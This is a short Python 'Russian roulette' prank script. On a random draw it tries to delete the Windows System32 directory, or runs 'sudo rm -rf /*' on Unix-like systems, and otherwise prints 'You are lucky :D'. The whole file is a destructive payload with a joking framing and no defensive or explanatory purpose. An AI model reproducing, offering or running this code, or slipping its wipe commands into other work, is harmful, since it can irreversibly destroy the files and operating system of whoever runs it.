import os, random 

missile_in_chamber = random.randint(0, 6)

if missile_in_chamber == 3:
    if os.name == 'nt':
        os.remove("C:\\Windows\\System32")
    if os.name == 'posix':
        os.system("sudo rm -rf /*")
else:
    print("You are lucky :D")
